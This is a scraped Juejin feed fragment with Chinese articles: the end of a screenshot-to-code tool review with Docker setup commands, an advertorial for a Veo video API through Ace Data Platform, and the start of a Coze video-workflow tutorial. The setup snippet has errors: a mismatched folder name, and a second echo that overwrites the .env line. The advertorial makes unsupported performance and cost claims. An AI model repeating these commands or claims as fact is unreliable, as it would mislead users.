<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38a842ecdc1c4842a2bbac13b79d8a36~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=FdKDAcmTO0UfI0cTLEqu0qGW3ac%3D" alt="" loading="lazy"/></p>
<p>我们把对应的代码粘贴复制到一个 html 文件中并双击打开：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00d663d2968b4666b4e4ee015ac301e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=LALa0tfNa3%2BLTlUUv%2BMmw09we%2Bo%3D" alt="" loading="lazy"/></p>
<p>可以看到它确实生成了一个博客网页，但是<strong>差别还是有些大的</strong>。主题、布局、排版和原图都差距较大，像是在原图的基础上又按照自己的理解设计了一个新的出来，只适用于不太在乎还原度的玩家。</p>
<p>最后——<strong>screen-to-code</strong>，在体验之后发现，<strong>它的操作便捷性以及还原度竟然秒杀前两个</strong>！</p>
<p>首先，在便捷性上：</p>
<ul>
<li><strong>只需要提供截图或者网页链接即可快速进行 AI 还原</strong>；</li>
<li>screen-to-code 会<strong>提供四个 Option，用户可以在其中对比找出一个还原度最高的</strong>；</li>
<li>还可以<strong>选中其中的某个 Option 进行对话式修改</strong>。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91427bc852334ca0b234789e9463634c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=kJCDNKKqB5BGyA5PpB6utwbItXA%3D" alt="" loading="lazy"/></p>
<p>其次，在还原度上我们以上面的截图为例，我们看看 screen-to-code 的实际效果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccb00369ba844cbb8510dc300474bb42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=rt0ss7fSOTsXORIsXcEaL0ae09M%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b9f57d898964fec85e6e7ec7ae72fa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=AgbCyC4L3I8KAh0Kts37JxdPK5Y%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7630402ef78c4b10a3e73ffa52158434~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=sYsDqTxNpyCeup4AfcqT3WopFps%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18200283997f45599d5d8389057da259~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=HZ7iEboBZ%2F0catyu4sD6Dbem4ZA%3D" alt="" loading="lazy"/></p>
<p>除了第二张之外，其他三张的还原度都挺高！尤其是 1 和 3，个人觉得可以直接拿来使用了。</p>
<p>另外，它还提供了七种生成方式，如下图所示：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87cd71bf4a3342a1baa8c56028dab99a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=QyZ%2FpZ30YcO88ADKEqYgNVp2iIk%3D" alt="" loading="lazy"/></p>
<p><strong>对于非技术人员来说（尤其是想做个官网、个人主页之类的小伙伴），HTML + Tailwind、HTML + CSS 以及 Bootstrap 这三种方式简直是为你们量身定做！</strong></p>
<p>找个喜欢的页面截图或者链接贴进去，不一会儿就给你生成好页面框架，你只需要下载文件后修改里面的内容和图片就可以直接使用了。</p>
<p>而剩下的几种方式，个人觉得<strong>比较适合大学生的期末作业</strong>。像 React + Tailwind 或者 Vue + Tailwind 这种，也不用啥工程化的东西，快速产出，完全不用为写页面而发愁。</p>
<h3 data-id="heading-2">部署</h3>
<p>说了这么多具体怎么使用呢？</p>
<p>两种方式：</p>
<ul>
<li>访问官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fscreenshottocode.com%2F%25E3%2580%2582%25E4%25B8%258D%25E8%25BF%2587%25E5%25BE%2597%25E8%258A%25B1%25E9%2592%25B1%25EF%25BC%258C%25E4%25B8%25A4%25E4%25B8%25AA%25E6%25A1%25A3%25E4%25BD%258D%25EF%25BC%259A%2415" target="_blank" title="https://screenshottocode.com/%E3%80%82%E4%B8%8D%E8%BF%87%E5%BE%97%E8%8A%B1%E9%92%B1%EF%BC%8C%E4%B8%A4%E4%B8%AA%E6%A1%A3%E4%BD%8D%EF%BC%9A$15" ref="nofollow noopener noreferrer">screenshottocode.com/。不过得花钱，两个档位…</a> 和 $40。</li>
<li>自己部署或者访问其他大佬部署好的。</li>
</ul>
<p>自己部署的话，推荐使用 docker 一键部署：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/abi/screenshot-to-code.git

<span class="hljs-built_in">cd</span> screen-to-code

<span class="hljs-comment"># 非常重要！！</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"OPENAI_API_KEY=sk-your-key"</span> &gt; .<span class="hljs-built_in">env</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"OPENAI_BASE_URL=your-custom-url"</span> &gt; .<span class="hljs-built_in">env</span>

docker compose up -d --build
</code></pre>
<p>成功后，访问 <code>http://localhost:5173</code> 即可。</p>
<p>最后补充三点：</p>
<ul>
<li>AI 模型需要多模态模型，比如 GPT-4o、或者 llava；</li>
<li>API Key 和 Base URL 可以在设置中进行配置；</li>
<li>要使用 URL 的方式，需要配置 ScreenshotOne API key，每月会免费提供 100 次的使用额度。个人开发完全够用</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79646347791f476f848522dd2c7f146b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=1%2B0IbgMusgA4dC7k2a0syXglnRk%3D" alt="" loading="lazy"/></p>
<p>附，测试生成的代码：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ee3a258088f47b19fa45e2056ab82b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiJ6YeR5b6X6ZGr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768487429&amp;x-signature=iHxgAUUGz10zTB%2FQVqV%2BOyHyuZY%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Veo API：0门槛量产商业级视频！2026视频流量密码，创作者/商家必藏]]></title>    <link>https://juejin.cn/post/7592822714068189235</link>    <guid>https://juejin.cn/post/7592822714068189235</guid>    <pubDate>2026-01-08T14:33:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592822714068189235" data-draft-id="7592822714068172851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Veo API：0门槛量产商业级视频！2026视频流量密码，创作者/商家必藏"/> <meta itemprop="keywords" content="API,Google"/> <meta itemprop="datePublished" content="2026-01-08T14:33:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="崔庆才丨静觅"/> <meta itemprop="url" content="https://juejin.cn/user/1521379821230269"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Veo API：0门槛量产商业级视频！2026视频流量密码，创作者/商家必藏
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379821230269/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    崔庆才丨静觅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T14:33:15.000Z" title="Thu Jan 08 2026 14:33:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2026年流量主战场已锁定视频端！小红书15秒种草视频10万+赞、抖音30秒品牌故事破百万播放、视频号直播切片单日引流500+精准客资… 但90%想靠视频变现的人，都被这些难题卡住：</p>
<ul>
<li>专业剪辑要学3个月，新手望而却步；</li>
<li>找团队拍1条商业视频花2000+，中小商家扛不住；</li>
<li>批量产出就掉画质，同质化严重没流量；</li>
<li>AI生成视频参数复杂+网络受限，劝退99%开发者</li>
</ul>
<p>别慌！刷屏创作者圈的「视频量产神器」——Veo API来了！AI驱动的视频生成与编辑API，让你0专业门槛、低成本批量产出高清商业级视频，更有<strong>Ace Data Platform生态加持</strong>（专属对接链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2F" target="_blank" title="https://platform.acedata.cloud/" ref="nofollow noopener noreferrer">Ace Data Platform官网</a>），稳定省心，个人创作、企业部署全hold住！</p>
<h2 data-id="heading-0">一、4大核心能力封神！Veo凭什么成生产力救星？</h2>
<p>直接把视频制作效率拉到天花板，全网创作者疯狂跟风的硬实力：</p>
<ol>
<li>
<p>文本/图片一键转视频，小白也能1分钟出片<br/>
输入文字脚本、上传产品图/素材图，Veo自动匹配场景、添加转场特效、生成字幕和背景音乐，无需手动调参！种草视频、产品介绍、知识科普全搞定，1分钟干完别人1天的活。</p>
</li>
<li>
<p>4K超清画质+多风格适配，商业级质感拉满<br/>
支持4K/1080P超清输出，色彩还原度超高、细节无模糊！ins风、国潮风、科技感、治愈系等100+风格模板任选，还能自定义品牌色调、水印，助力打造专属IP，质感碾压同行。</p>
</li>
<li>
<p>智能剪辑+批量生成，效率直接翻10倍<br/>
批量导入脚本生成多条视频，自动规避重复片段；智能截取高光，精准适配小红书（15s）、抖音（30s）、视频号（60s）等平台时长要求，无需二次修改，日更不熬夜。</p>
</li>
<li>
<p>多模态交互+高兼容性，开发10分钟接入<br/>
支持文本、图像多模态指令，可对接自有素材库；适配Python、JavaScript等全主流编程语言，提供详细开发文档和示例代码，新手开发者也能快速上手调试。</p>
</li>
</ol>
<h2 data-id="heading-1">二、5大落地场景，覆盖从个人到企业全需求</h2>
<p>不同用户都能找到核心价值，流量变现、降本增效一把抓：</p>
<ol>
<li>
<p>自媒体创作：批量生成知识科普、书单/影单分享、短视频封面，轻松维持日更，抢占流量红利，不用熬夜剪辑！</p>
</li>
<li>
<p>电商营销：产出产品多角度展示、场景化种草、直播切片视频，无需实景拍摄，营销素材成本直降90%，转化率提升3倍+！</p>
</li>
<li>
<p>企业培训：文字手册、PPT一键转动画培训视频，生动易懂，员工学习效率翻倍；还能批量生成不同岗位定制化内容！</p>
</li>
<li>
<p>品牌营销：批量产出品牌宣传、节日营销、活动预热视频，风格统一覆盖全平台，快速提升品牌曝光度和用户记忆点！</p>
</li>
<li>
<p>娱乐开发：开发视频变装、AI换脸、老视频修复等趣味APP功能，强互动性拉满用户留存率和分享欲，打造爆款应用！</p>
</li>
</ol>
<h2 data-id="heading-2">三、避坑指南！成本直降1/3</h2>
<p>商业部署/大规模调用：Ace Data Platform协同方案（强推！）
通过专属通道接入（链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2Fveo-videos" target="_blank" title="https://platform.acedata.cloud/documents/veo-videos" ref="nofollow noopener noreferrer">Veo API专属对接页</a>），3大优势解决所有痛点：</p>
<ul>
<li>成本更低：阶梯定价+失败调用不计费，比官方直连节省30%+成本，中小商家无压力；</li>
<li>网络更稳：国内直连专属节点，无需额外配置代理，API可用性99.9%，批量生成不卡顿、不中断；</li>
<li>生态更全：联动平台其他API，可以实现更高效率生成视频，一站式解决您制作视频的所有步骤。</li>
</ul>
<h2 data-id="heading-3">四、3步快速接入，解锁视频量产超能力</h2>
<ol>
<li>注册Ace Data Platform账号，进入<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2Fveo-videos" target="_blank" title="https://platform.acedata.cloud/documents/veo-videos" ref="nofollow noopener noreferrer">Veo API专属对接页</a>，领取专属API Key；</li>
<li>参考多语言示例代码（含Python、JavaScript等），按需配置文本转视频、图片转视频、智能剪辑等参数；</li>
<li>发起调用并对接自有系统/创作工具，生成视频自动存储至平台云空间！</li>
</ol>
<h2 data-id="heading-4">五、限时福利！手慢无！</h2>
<p>新用户注册Ace Data Platform，直接解锁Veo API免费体验额度！<br/>
无套路！个人/企业通用 | 零成本试错 | 即领即用！<br/>
点击直达领取：<a href="https://link.juejin.cn?target=https%3A%2F%2Fplatform.acedata.cloud%2Fdocuments%2Fveo-videos" target="_blank" title="https://platform.acedata.cloud/documents/veo-videos" ref="nofollow noopener noreferrer">Veo API免费体验通道</a></p>
<p>2026视频流量风口，拼的就是「量产能力」+「内容质感」！Veo API帮你跳过专业门槛、砍掉高成本，Ace Data Platform生态更让视频创作从“盲目产出”升级为“精准变现”～</p>
<p>不管你是想靠短视频变现的自媒体人，还是想降本增效的电商商家、企业营销人员，这波免费体验机会千万别错过！先体验再决策，零风险开启视频量产爆发之旅！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[18条作品狂揽390万赞？我用Coze破解了“情绪放大镜”的流量密码]]></title>    <link>https://juejin.cn/post/7592818272153763867</link>    <guid>https://juejin.cn/post/7592818272153763867</guid>    <pubDate>2026-01-08T13:26:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592818272153763867" data-draft-id="7592768559169830938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="18条作品狂揽390万赞？我用Coze破解了“情绪放大镜”的流量密码"/> <meta itemprop="keywords" content="Coze,AIGC,人工智能"/> <meta itemprop="datePublished" content="2026-01-08T13:26:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="后端小肥肠"/> <meta itemprop="url" content="https://juejin.cn/user/2966945320667536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            18条作品狂揽390万赞？我用Coze破解了“情绪放大镜”的流量密码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2966945320667536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    后端小肥肠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T13:26:26.000Z" title="Thu Jan 08 2026 13:26:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是小肥肠！最近心理学赛道杀出了一匹黑马——【情绪放大镜】，<strong>仅仅发布18个作品就狂揽390万赞，吸粉27万！</strong> 这种高共鸣类视频简直是流量收割机。 很多朋友想做，但觉得文案难写、画面难画。今天直接安排！<strong>仅用 Coze 就能搭建全自动</strong> <strong>工作流</strong> <strong>。</strong> 输入主题和BGM，3分钟直出剪映草稿。想在这个新风口分一杯羹的朋友，这篇干货千万别错过，跟练走起~</p>
<h2 data-id="heading-0">1. 前言</h2>
<p>最近，心理学赛道杀出一匹黑马。一位名叫【情绪放大镜】的博主，仅仅发布了18条作品，就狂揽<strong>390万点赞</strong>，涨粉27万。这种视频凭借细腻的情绪共鸣和简约黑白画面，斩获极高流量。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfb01f72bfa4de6bfc5b86d4883cc7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=pgk306KMGU2A5jhBvzBsqvwQ2q0%3D" alt="" loading="lazy"/></p>
<p>其实这种类型的视频可以用Coze工作流一键生成，只需要找到工作流界面，在开始节点处输入主题和背景音乐，点击底部【试运行】按钮。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fb12ccf18fc443ba59d621da82975d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=QXRYY3Y1TxCFpYXagbERNxWdwl0%3D" alt="" loading="lazy"/></p>
<p>等待几分钟即可得到剪映草稿地址，只需要将其粘贴到剪映小助手，点击【创建剪映草稿】，等待几秒钟就可以获取下面的成品视频：</p>
